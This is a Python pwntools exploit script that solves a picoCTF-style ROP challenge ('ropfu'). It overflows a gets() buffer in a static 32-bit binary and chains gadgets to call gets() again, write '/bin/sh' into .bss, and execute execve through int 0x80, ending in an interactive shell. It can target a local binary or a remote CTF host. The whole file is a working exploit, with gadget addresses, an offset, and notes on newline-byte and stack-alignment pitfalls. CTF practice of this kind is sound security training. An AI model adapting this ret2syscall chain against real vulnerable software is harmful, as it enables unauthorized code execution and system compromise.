#!/usr/bin/env python3
"""
ropfu - picoCTF 2022 style ROP challenge
32-bit static binary, gets() overflow in vuln(), no PIE, no real stack canary
(checksec flags one, but vuln() has no canary check in practice).

Strategy: ret2syscall
  1. Overwrite return address with a ROP chain that calls the binary's
     internal gets() a second time, writing "/bin/sh\x00" into a fixed,
     writable .bss address.
  2. Chain pop/mov gadgets to set up registers for execve("/bin/sh", NULL, NULL)
     via `int 0x80` (eax=0xb, ebx=bss ptr, ecx=0, edx=0).

Gotchas:
  - gets() is cdecl: after it returns, its one argument is still sitting
    on the stack (never popped by callee) -- the chain needs a throwaway
    "pop reg; ret" right after the fake return address to re-sync the stack,
    otherwise the following gadget consumes the leftover argument instead
    of its intended value.
  - gets() itself terminates reading at the first 0x0a (newline) byte, so
    every gadget address used in the ROP chain must avoid a 0x0a byte in
    any position, or the payload gets truncated mid-chain. Several of the
    obvious gadgets (e.g. the only bare "pop eax; ret") live in the
    0x080a0000 page and were unusable for exactly this reason.
"""
from pwn import *

context.arch = 'i386'

BINARY = './vuln'
HOST, PORT = 'xebec.cylabacademy.net', 10355

pop_ecx = 0x08049a31           # pop ecx ; ret
mov_eax_ecx = 0x08099b90       # mov eax, ecx ; ret
pop_edx_ebx_esi = 0x0805848e   # pop edx ; pop ebx ; pop esi ; ret
int_0x80 = 0x08049f12          # int 0x80
gets_addr = 0x0804cb70         # _IO_gets (internal gets implementation)
bss = 0x080e5500               # writable scratch address inside .bss
OFFSET = 28                    # buf[16] + padding(8) + saved ebp(4) -> ret addr


def build_payload():
    p = b'A' * OFFSET
    p += p32(gets_addr)
    p += p32(pop_ecx)          # fake return for gets(); also re-syncs stack
    p += p32(bss)               # gets() argument: write "/bin/sh" here
    p += p32(pop_ecx)           # real: set ecx = 0xb
    p += p32(0xb)
    p += p32(mov_eax_ecx)       # eax = ecx = 0xb (execve syscall number)
    p += p32(pop_edx_ebx_esi)
    p += p32(0)                 # edx = 0 (envp)
    p += p32(bss)                # ebx = "/bin/sh" pointer (argv[0]/path)
    p += p32(0)                  # esi = dummy
    p += p32(pop_ecx)
    p += p32(0)                  # ecx = 0 (argv)
    p += p32(int_0x80)           # execve("/bin/sh", NULL, NULL)
    assert 0x0a not in p[OFFSET:], 'gadget address contains a newline byte!'
    return p


def exploit(io):
    io.recvline(timeout=5)
    io.send(build_payload() + b'\n')
    io.send(b'/bin/sh\x00\n')
    io.interactive()


if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        io = remote(HOST, PORT)
    else:
        io = process(BINARY)
    exploit(io)
